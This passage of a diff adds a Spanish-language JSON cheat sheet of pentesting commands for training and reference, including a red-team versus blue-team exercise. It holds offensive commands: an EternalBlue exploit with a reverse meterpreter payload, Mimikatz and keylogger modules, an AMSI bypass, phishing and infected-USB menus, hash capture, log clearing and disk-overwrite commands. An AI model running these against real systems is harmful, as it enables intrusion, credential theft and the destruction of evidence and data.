+          "tags": ["agent", "header"]
+        },
+        {
+          "title": "Seguir Redirecciones",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt -r",
+          "description": "Sigue redirecciones HTTP",
+          "tags": ["redirect", "follow"]
+        },
+        {
+          "title": "Threads",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt -t 50",
+          "description": "Especifica número de threads",
+          "tags": ["threads", "performance"]
+        },
+        {
+          "title": "Tiempo de Espera",
+          "command": "gobuster dir -u http://objetivo.com -w wordlist.txt --timeout 10s",
+          "description": "Configura timeout de requests",
+          "tags": ["timeout", "config"]
+        }
+      ]
+    },
+    {
+      "id": "tcpdump",
+      "name": "TCPDump",
+      "category": "network",
+      "description": "Analizador de paquetes de red en línea de comandos",
+      "commands": [
+        {
+          "title": "Captura Básica",
+          "command": "tcpdump -i eth0",
+          "description": "Captura todo el tráfico en eth0",
+          "tags": ["capture", "basic"]
+        },
+        {
+          "title": "Guardar Captura",
+          "command": "tcpdump -i eth0 -w captura.pcap",
+          "description": "Guarda la captura en un archivo",
+          "tags": ["save", "file"]
+        },
+        {
+          "title": "Filtrar por Host",
+          "command": "tcpdump host 192.168.1.1",
+          "description": "Captura tráfico de un host específico",
+          "tags": ["filter", "host"]
+        },
+        {
+          "title": "Filtrar por Puerto",
+          "command": "tcpdump port 80",
+          "description": "Captura tráfico en puerto específico",
+          "tags": ["filter", "port"]
+        },
+        {
+          "title": "Mostrar Contenido ASCII",
+          "command": "tcpdump -A",
+          "description": "Muestra contenido en ASCII",
+          "tags": ["ascii", "content"]
+        },
+        {
+          "title": "Filtrar por Protocolo",
+          "command": "tcpdump tcp",
+          "description": "Captura solo tráfico TCP",
+          "tags": ["filter", "protocol"]
+        },
+        {
+          "title": "Captura Detallada",
+          "command": "tcpdump -vvv",
+          "description": "Muestra información muy detallada",
+          "tags": ["verbose", "detailed"]
+        },
+        {
+          "title": "Límite de Paquetes",
+          "command": "tcpdump -c 100",
+          "description": "Captura solo 100 paquetes",
+          "tags": ["limit", "count"]
+        },
+        {
+          "title": "Filtro Complejo",
+          "command": "tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'",
+          "description": "Captura paquetes TCP con datos",
+          "tags": ["filter", "complex"]
+        },
+        {
+          "title": "Leer Archivo PCAP",
+          "command": "tcpdump -r captura.pcap",
+          "description": "Lee archivo de captura guardado",
+          "tags": ["read", "pcap"]
+        }
+      ]
+    },    {
+      "id": "empire",
+      "name": "PowerShell Empire",
+      "category": "post-exploitation",
+      "description": "Framework de post-explotación basado en PowerShell",
+      "commands": [
+
+      ]
+    },
+    {
+      "id": "set",
+      "name": "Social-Engineer Toolkit",
+      "category": "social-engineering",
+      "description": "Framework para pruebas de ingeniería social",
+      "commands": [
+
+      ]
+    },
+    {
+      "id": "beef",
+      "name": "Browser Exploitation Framework (BeEF)",
+      "category": "web-exploitation",
+      "description": "Framework para explotación de navegadores web",
+      "commands": [
+        {
+          "title": "Iniciar BeEF",
+          "command": "beef-xss",
+          "description": "Inicia el Framework de Explotación del Navegador",
+          "tags": ["start", "basic"]
+        },
+        {
+          "title": "Listar Hooks",
+          "command": "beef-hooks",
+          "description": "Muestra navegadores comprometidos",
+          "tags": ["hooks", "list"]
+        },
+        {
+          "title": "Generar Hook HTML",
+          "command": "beef-hook-generator",
+          "description": "Genera código HTML para hook de navegador",
+          "tags": ["hook", "html"]
+        },
+        {
+          "title": "Ejecutar Módulo",
+          "command": "beef-module run social_engineering/fake_flash_update",
+          "description": "Ejecuta módulo de ingeniería social",
+          "tags": ["module", "social-engineering"]
+        }
+      ]
+    },
+    {
+      "id": "maltego",
+      "name": "Maltego",
+      "category": "reconnaissance",
+      "description": "Herramienta de recolección y minería de información",
+      "commands": [
+        {
+          "title": "Iniciar Maltego",
+          "command": "maltego",
+          "description": "Abre la interfaz de Maltego",
+          "tags": ["start", "basic"]
+        },
+        {
+          "title": "Nueva Transformación",
+          "command": "maltego-transform domain-to-dns",
+          "description": "Realiza transformación de dominio a registros DNS",
+          "tags": ["transform", "dns"]
+        },
+        {
+          "title": "Exportar Gráfico",
+          "command": "maltego-export current-graph.mtgx",
+          "description": "Exporta el gráfico de relaciones actual",
+          "tags": ["export", "graph"]
+        }
+      ]
+    },
+    {
+      "id": "responder",
+      "name": "Responder",
+      "category": "network-poisoning",
+      "description": "Herramienta para envenenamiento LLMNR/NBT-NS",
+      "commands": [
+        {
+          "title": "Iniciar Responder",
+          "command": "responder -I eth0 -rdwv",
+          "description": "Inicia Responder en interfaz eth0",
+          "tags": ["start", "network"]
+        },
+        {
+          "title": "Capturar Hashes",
+          "command": "responder -I eth0 --lm",
+          "description": "Captura hashes LM",
+          "tags": ["hash", "capture"]
+        },
+        {
+          "title": "Modo Silencioso",
+          "command": "responder -I eth0 -s",
+          "description": "Modo silencioso de Responder",
+          "tags": ["silent", "stealth"]
+        }
+      ]
+    },
+    {
+      "id": "dnsrecon",
+      "name": "DNSRecon",
+      "category": "reconnaissance",
+      "description": "Herramienta de reconocimiento DNS",
+      "commands": [
+        {
+          "title": "Escaneo Básico",
+          "command": "dnsrecon -d ejemplo.com",
+          "description": "Realiza reconocimiento básico de dominio",
+          "tags": ["scan", "basic"]
+        },
+        {
+          "title": "Transferencia de Zona",
+          "command": "dnsrecon -d ejemplo.com -t axfr",
+          "description": "Intenta transferencia de zona DNS",
+          "tags": ["zone", "transfer"]
+        },
+        {
+          "title": "Bruteforce Subdominios",
+          "command": "dnsrecon -d ejemplo.com -D /usr/share/wordlists/subdomains.txt -t brt",
+          "description": "Fuerza bruta de subdominios",
+          "tags": ["bruteforce", "subdomains"]
+        }
+      ]
+    },
+    {
+      "id": "theharvester",
+      "name": "TheHarvester",
+      "category": "reconnaissance",
+      "description": "Herramienta de recolección de correos y subdominios",
+      "commands": [
+        {
+          "title": "Búsqueda Básica",
+          "command": "theHarvester -d ejemplo.com -l 500 -b google",
+          "description": "Busca información usando Google",
+          "tags": ["search", "basic"]
+        },
+        {
+          "title": "Múltiples Fuentes",
+          "command": "theHarvester -d ejemplo.com -b all",
+          "description": "Busca en todas las fuentes disponibles",
+          "tags": ["search", "comprehensive"]
+        },
+        {
+          "title": "Exportar Resultados",
+          "command": "theHarvester -d ejemplo.com -b google -f resultado.xml",
+          "description": "Exporta resultados a archivo XML",
+          "tags": ["export", "xml"]
+        }
+      ]
+    },
+    {
+      "id": "system-info",
+      "name": "Herramientas de Información del Sistema",
+      "category": "system",
+      "description": "Comandos para obtener información del sistema",
+      "commands": [
+        {
+          "title": "Obtener IP Pública",
+          "command": "curl ifconfig.me",
+          "description": "Muestra la IP pública actual",
+          "tags": ["ip", "public"]
+        },
+        {
+          "title": "Información del Sistema Linux",
+          "command": "uname -a",
+          "description": "Muestra detalles completos del sistema",
+          "tags": ["system", "info"]
+        },
+        {
+          "title": "Información de Red",
+          "command": "ip addr show",
+          "description": "Muestra todas las interfaces de red",
+          "tags": ["network", "interfaces"]
+        },
+        {
+          "title": "Información de Hardware",
+          "command": "lscpu && free -h && df -h",
+          "description": "Muestra CPU, memoria y espacio en disco",
+          "tags": ["hardware", "resources"]
+        },
+        {
+          "title": "Información de Windows",
+          "command": "systeminfo",
+          "description": "Muestra información detallada del sistema Windows",
+          "tags": ["system", "windows"]
+        }
+      ]
+    }
+    ,
+    {
+      "id": "empire",
+      "name": "PowerShell Empire",
+      "category": "post-exploitation",
+      "description": "Framework de post-explotación basado en PowerShell",
+      "commands": [
+        {
+          "title": "Iniciar Empire",
+          "command": "empire --rest --username empireadmin --password password123",
+          "description": "Inicia Empire con interfaz REST",
+          "tags": ["start", "basic"]
+        },
+        {
+          "title": "Listar Listeners",
+          "command": "listeners",
+          "description": "Muestra los listeners disponibles",
+          "tags": ["listeners", "list"]
+        },
+        {
+          "title": "Crear Listener HTTP",
+          "command": "uselistener http",
+          "description": "Configura listener HTTP",
+          "tags": ["listener", "http"]
+        },
+        {
+          "title": "Generar Stager",
+          "command": "usestager windows/launcher_bat",
+          "description": "Genera stager en formato BAT",
+          "tags": ["stager", "windows"]
+        },
+        {
+          "title": "Listar Agentes",
+          "command": "agents",
+          "description": "Muestra agentes activos",
+          "tags": ["agents", "list"]
+        },
+        {
+          "title": "Interactuar Agente",
+          "command": "interact C2AGENT",
+          "description": "Conecta con un agente específico",
+          "tags": ["agent", "interact"]
+        },
+        {
+          "title": "Ejecutar PowerShell",
+          "command": "shell Get-Process",
+          "description": "Ejecuta comando PowerShell",
+          "tags": ["shell", "powershell"]
+        },
+        {
+          "title": "Bypass AMSI",
+          "command": "bypassamsi",
+          "description": "Intenta bypass de AMSI",
+          "tags": ["bypass", "amsi"]
+        },
+        {
+          "title": "Keylogger",
+          "command": "usemodule credentials/keylogger",
+          "description": "Inicia módulo de keylogger",
+          "tags": ["keylogger", "credentials"]
+        },
+        {
+          "title": "Mimikatz",
+          "command": "usemodule credentials/mimikatz/logonpasswords",
+          "description": "Ejecuta Mimikatz para obtener credenciales",
+          "tags": ["mimikatz", "credentials"]
+        }
+      ]
+    },
+    {
+      "id": "set",
+      "name": "Social-Engineer Toolkit",
+      "category": "social-engineering",
+      "description": "Framework para pruebas de ingeniería social",
+      "commands": [
+        {
+          "title": "Iniciar SET",
+          "command": "setoolkit",
+          "description": "Inicia la herramienta SET",
+          "tags": ["start", "basic"]
+        },
+        {
+          "title": "Spear-Phishing",
+          "command": "1) Social-Engineering Attacks -> 1) Spear-Phishing Attack Vectors",
+          "description": "Configura ataque de phishing dirigido",
+          "tags": ["phishing", "email"]
+        },
+        {
+          "title": "Website Attack",
+          "command": "1) Social-Engineering Attacks -> 2) Website Attack Vectors",
+          "description": "Configura ataque basado en web",
+          "tags": ["web", "attack"]
+        },
+        {
+          "title": "Infectar USB",
+          "command": "1) Social-Engineering Attacks -> 3) Infectious Media Generator",
+          "description": "Crea medio infectado",
+          "tags": ["usb", "infection"]
+        },
+        {
+          "title": "Mass Mailer",
+          "command": "1) Social-Engineering Attacks -> 5) Mass Mailer Attack",
+          "description": "Envío masivo de emails",
+          "tags": ["email", "mass"]
+        },
+        {
+          "title": "PowerShell Attack",
+          "command": "1) Social-Engineering Attacks -> 9) PowerShell Attack Vectors",
+          "description": "Ataque usando PowerShell",
+          "tags": ["powershell", "attack"]
+        },
+        {
+          "title": "QRCode Generator",
+          "command": "1) Social-Engineering Attacks -> 10) QRCode Generator",
+          "description": "Genera códigos QR maliciosos",
+          "tags": ["qr", "generator"]
+        },
+        {
+          "title": "SMS Spoofing",
+          "command": "1) Social-Engineering Attacks -> 7) SMS Spoofing Attack Vector",
+          "description": "Suplantación de SMS",
+          "tags": ["sms", "spoofing"]
+        },
+        {
+          "title": "Wireless Attack",
+          "command": "1) Social-Engineering Attacks -> 8) Wireless Access Point Attack Vector",
+          "description": "Ataque a punto de acceso wireless",
+          "tags": ["wireless", "attack"]
+        },
+        {
+          "title": "Update SET",
+          "command": "update",
+          "description": "Actualiza la herramienta SET",
+          "tags": ["update", "maintenance"]
+        }
+      ]
+    },
+    {
+      "id": "owasp-zap",
+      "name": "OWASP ZAP",
+      "category": "web",
+      "description": "Herramienta de pruebas de seguridad en aplicaciones web",
+      "commands": [
+        {
+          "title": "Escaneo Rápido",
+          "command": "zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://objetivo.com",
+          "description": "Realiza un escaneo rápido del objetivo",
+          "tags": ["scan", "quick"]
+        },
+        {
+          "title": "Escaneo Completo",
+          "command": "zap-cli full-scan --self-contained http://objetivo.com",
+          "description": "Realiza un escaneo completo",
+          "tags": ["scan", "full"]
+        },
+        {
+          "title": "Spider",
+          "command": "zap-cli spider http://objetivo.com",
+          "description": "Ejecuta spider en el objetivo",
+          "tags": ["spider", "crawl"]
+        },
+        {
+          "title": "Escaneo Activo",
+          "command": "zap-cli active-scan http://objetivo.com",
+          "description": "Realiza escaneo activo",
+          "tags": ["scan", "active"]
+        },
+        {
+          "title": "Reporte HTML",
+          "command": "zap-cli report -o reporte.html -f html",
+          "description": "Genera reporte en formato HTML",
+          "tags": ["report", "html"]
+        },
+        {
+          "title": "Alertas",
+          "command": "zap-cli alerts",
+          "description": "Muestra alertas encontradas",
+          "tags": ["alerts", "show"]
+        },
+        {
+          "title": "Escaneo Ajax",
+          "command": "zap-cli ajax-spider http://objetivo.com",
+          "description": "Ejecuta spider para contenido AJAX",
+          "tags": ["ajax", "spider"]
+        },
+        {
+          "title": "Políticas",
+          "command": "zap-cli policies",
+          "description": "Lista políticas disponibles",
+          "tags": ["policies", "list"]
+        },
+        {
+          "title": "Contextos",
+          "command": "zap-cli context",
+          "description": "Gestiona contextos de escaneo",
+          "tags": ["context", "manage"]
+        },
+        {
+          "title": "Excluir URL",
+          "command": "zap-cli exclude \"http://objetivo.com/excluir/*\"",
+          "description": "Excluye URLs del escaneo",
+          "tags": ["exclude", "url"]
+        }
+      ]
+    },
+    {
+      "id": "dd",
+      "name": "dd",
+      "category": "system",
+      "description": "Herramienta para copiar y convertir archivos",
+      "commands": [
+        {
+          "title": "Crear una imagen de disco",
+          "command": "dd if=/dev/sda of=backup.img",
+          "description": "Crea una imagen de un disco completo",
+          "tags": ["backup", "disk"]
+        },
+        {
+          "title": "Restaurar una imagen de disco",
+          "command": "dd if=backup.img of=/dev/sda",
+          "description": "Restaura una imagen a un disco",
+          "tags": ["restore", "disk"]
+        },
+        {
+          "title": "Copiar un disco a otro",
+          "command": "dd if=/dev/sda of=/dev/sdb",
+          "description": "Copia el contenido de un disco a otro",
+          "tags": ["copy", "disk"]
+        },
+        {
+          "title": "Crear una imagen comprimida",
+          "command": "dd if=/dev/sda | gzip > backup.img.gz",
+          "description": "Crea una imagen comprimida de un disco",
+          "tags": ["backup", "disk", "compression"]
+        },
+        {
+          "title": "Restaurar una imagen comprimida",
+          "command": "gzip -dc backup.img.gz | dd of=/dev/sda",
+          "description": "Restaura una imagen comprimida a un disco",
+          "tags": ["restore", "disk", "compression"]
+        },
+        {
+          "title": "Borrar un disco de forma segura",
+          "command": "dd if=/dev/urandom of=/dev/sda",
+          "description": "Sobrescribe un disco con datos aleatorios para borrarlo de forma segura",
+          "tags": ["wipe", "security"]
+        },
+        {
+          "title": "Crear una imagen de memoria RAM",
+          "command": "dd if=/dev/mem of=ram.img",
+          "description": "Crea una imagen de la memoria RAM",
+          "tags": ["memory", "forensics"]
+        },
+        {
+          "title": "Crear una imagen de un dispositivo USB",
+          "command": "dd if=/dev/sdb of=usb_backup.img",
+          "description": "Crea una imagen de un dispositivo USB",
+          "tags": ["backup", "usb"]
+        }
+      ]
+    },
+    {
+      "id": "linux-basics",
+      "name": "Comandos Básicos de Linux",
+      "category": "system",
+      "description": "Comandos esenciales para administración de sistemas",
+      "commands": [
+        {
+          "title": "Listar archivos detallado",
+          "command": "ls -la",
+          "description": "Lista archivos incluyendo ocultos con detalles",
+          "tags": ["files", "list"]
+        },
+        {
+          "title": "Buscar archivos",
+          "command": "find / -name archivo.txt",
+          "description": "Busca un archivo en todo el sistema",
+          "tags": ["files", "search"]
+        },
+        {
+          "title": "Ver procesos",
+          "command": "ps aux",
+          "description": "Muestra todos los procesos en ejecución",
+          "tags": ["process", "monitor"]
+        },
+        {
+          "title": "Monitoreo en tiempo real",
+          "command": "top",
+          "description": "Muestra procesos en tiempo real",
+          "tags": ["process", "monitor"]
+        },
+        {
+          "title": "Verificar espacio",
+          "command": "df -h",
+          "description": "Muestra espacio en disco disponible",
+          "tags": ["disk", "storage"]
+        },
+        {
+          "title": "Copiar archivos",
+          "command": "cp origen destino",
+          "description": "Copia archivos o directorios",
+          "tags": ["files", "copy"]
+        },
+        {
+          "title": "Mover archivos",
+          "command": "mv origen destino",
+          "description": "Mueve o renombra archivos",
+          "tags": ["files", "move"]
+        },
+        {
+          "title": "Crear directorio",
+          "command": "mkdir directorio",
+          "description": "Crea un nuevo directorio",
+          "tags": ["directory", "create"]
+        },
+        {
+          "title": "Eliminar archivo",
+          "command": "rm archivo",
+          "description": "Elimina un archivo",
+          "tags": ["files", "delete"]
+        },
+        {
+          "title": "Cambiar permisos",
+          "command": "chmod 755 archivo",
+          "description": "Modifica permisos de archivo",
+          "tags": ["permissions", "security"]
+        },
+        {
+          "title": "Ver contenido",
+          "command": "cat archivo",
+          "description": "Muestra contenido de un archivo",
+          "tags": ["files", "view"]
+        },
+        {
+          "title": "Editar archivo",
+          "command": "nano archivo",
+          "description": "Edita un archivo con nano",
+          "tags": ["files", "edit"]
+        },
+        {
+          "title": "Buscar en archivo",
+          "command": "grep 'texto' archivo",
+          "description": "Busca texto en archivos",
+          "tags": ["files", "search"]
+        },
+        {
+          "title": "Ver uso de memoria",
+          "command": "free -h",
+          "description": "Muestra uso de memoria RAM",
+          "tags": ["memory", "monitor"]
+        },
+        {
+          "title": "Crear enlace simbólico",
+          "command": "ln -s origen enlace",
+          "description": "Crea un enlace simbólico",
+          "tags": ["files", "link"]
+        }
+      ]
+    },
+    {
+      "id": "metadata",
+      "name": "Lectura de Metadatos",
+      "category": "forensics",
+      "description": "Herramientas para leer y analizar metadatos en Kali Linux",
+      "commands": [
+        {
+          "title": "Leer metadatos de imágenes",
+          "command": "exiftool imagen.jpg",
+          "description": "Muestra metadatos de archivos de imagen",
+          "tags": ["metadata", "images"]
+        },
+        {
+          "title": "Leer metadatos de PDF",
+          "command": "pdfinfo documento.pdf",
+          "description": "Muestra metadatos de archivos PDF",
+          "tags": ["metadata", "pdf"]
+        },
+        {
+          "title": "Leer metadatos de documentos",
+          "command": "catdoc -m archivo.doc",
+          "description": "Muestra metadatos de archivos DOC",
+          "tags": ["metadata", "documents"]
+        },
+        {
+          "title": "Leer metadatos de archivos de audio",
+          "command": "exiftool audio.mp3",
+          "description": "Muestra metadatos de archivos de audio",
+          "tags": ["metadata", "audio"]
+        },
+        {
+          "title": "Leer metadatos de archivos de video",
+          "command": "exiftool video.mp4",
+          "description": "Muestra metadatos de archivos de video",
+          "tags": ["metadata", "video"]
+        },
+        {
+          "title": "Leer metadatos de archivos en general",
+          "command": "file archivo",
+          "description": "Muestra información básica sobre el tipo de archivo",
+          "tags": ["metadata", "files"]
+        }
+      ]
+    },
+    {
+      "id": "equipo_rojo",
+      "name": "Equipo Rojo (Kali Linux)",
+      "category": "offensive",
+      "description": "Equipo encargado de atacar y obtener el archivo secreto.txt del equipo azul.",
+      "commands": [
+        {
+          "title": "Escaneo de red",
+          "command": "nmap -sV -O 192.168.1.0/24",
+          "description": "Escanea la red para identificar la IP del equipo azul y sus servicios abiertos.",
+          "tags": ["reconocimiento", "network"]
+        },
+        {
+          "title": "Exploración de vulnerabilidades",
+          "command": "nmap --script vuln 192.168.1.X",
+          "description": "Busca vulnerabilidades en los servicios del equipo azul.",
+          "tags": ["vulnerability", "scan"]
+        },
+        {
+          "title": "Explotación de vulnerabilidades",
+          "command": "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.X; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.Y; run'",
+          "description": "Explota una vulnerabilidad en el equipo azul para ganar acceso.",
+          "tags": ["exploitation", "metasploit"]
+        },
+        {
+          "title": "Crear una sesión de Meterpreter",
+          "command": "sessions -i 1",
+          "description": "Accede a la sesión de Meterpreter para controlar el equipo azul.",
+          "tags": ["post-exploitation", "meterpreter"]
+        },
+        {
+          "title": "Buscar el archivo secreto.txt",
+          "command": "search -f secreto.txt",
+          "description": "Busca el archivo secreto.txt en el equipo azul.",
+          "tags": ["file", "search"]
+        },
+        {
+          "title": "Descargar el archivo secreto.txt",
+          "command": "download C:\\ruta\\secreto.txt /ruta/local/secreto.txt",
+          "description": "Descarga el archivo secreto.txt desde el equipo azul.",
+          "tags": ["file", "download"]
+        },
+        {
+          "title": "Borrar huellas",
+          "command": "clearev",
+          "description": "Elimina los registros de eventos en el equipo azul para evitar ser detectado.",
+          "tags": ["forensics", "cleanup"]
+        }
+      ]
+    },
+    {
+      "id": "equipo_azul",
+      "name": "Equipo Azul (Windows 10)",
+      "category": "defensive",
+      "description": "Equipo encargado de proteger el archivo secreto.txt y detectar intrusiones.",
+      "commands": [
+        {
+          "title": "Configurar firewall",
+          "command": "New-NetFirewallRule -DisplayName 'Bloquear SMB' -Direction Inbound -Protocol TCP -LocalPort 445 -Action Block",
+          "description": "Bloquea el puerto SMB para prevenir ataques como EternalBlue.",
+          "tags": ["firewall", "security"]
+        },
+        {
+          "title": "Monitorear eventos de seguridad",
+          "command": "Get-WinEvent -LogName Security",
+          "description": "Revisa los registros de seguridad para detectar actividades sospechosas.",
+          "tags": ["monitoring", "logs"]
+        },
+        {
+          "title": "Verificar procesos sospechosos",
+          "command": "Get-Process | Where-Object { $_.CPU -gt 50 }",
+          "description": "Busca procesos que consuman muchos recursos, posiblemente maliciosos.",
+          "tags": ["process", "monitor"]
+        },
+        {
+          "title": "Cambiar permisos del archivo secreto.txt",
+          "command": "icacls C:\\ruta\\secreto.txt /deny Everyone:(R)",
+          "description": "Restringe el acceso al archivo secreto.txt para todos los usuarios.",
+          "tags": ["permissions", "security"]
+        },
+        {
+          "title": "Habilitar BitLocker",
+          "command": "Manage-bde -on C:",
+          "description": "Cifra el disco duro para proteger los datos en caso de robo.",
+          "tags": ["encryption", "security"]
+        },
+        {
+          "title": "Instalar un antivirus",
+          "command": "Instalar Windows Defender o un antivirus de terceros",
+          "description": "Protege el sistema contra malware y actividades maliciosas.",
+          "tags": ["antivirus", "security"]
+        },
+        {
+          "title": "Crear alertas de intrusión",
+          "command": "Configurar alertas en el Centro de Seguridad de Windows",
+          "description": "Configura alertas para notificar sobre actividades sospechosas.",
+          "tags": ["monitoring", "alerts"]
+        }
+      ]
+    }
+  ],
+  "resources": {
+    "books": [
+      {
+        "title": "Red Team Field Manual",
+        "author": "Ben Clark",
+        "description": "Manual práctico para pruebas de penetración",
+        "downloadUrl": "resources/rtfm.pdf",
+        "tags": ["red team", "pentesting"]
+      }
+    ],
+    "videos": [
+      {
+        "title": "Introducción a Buffer Overflow",
+        "author": "LiveOverflow",
+        "platform": "YouTube",
+        "url": "https://youtube.com/watch?v=example1",
+        "tags": ["exploit development", "tutorial"]
+      }
+    ]
+  }
+}
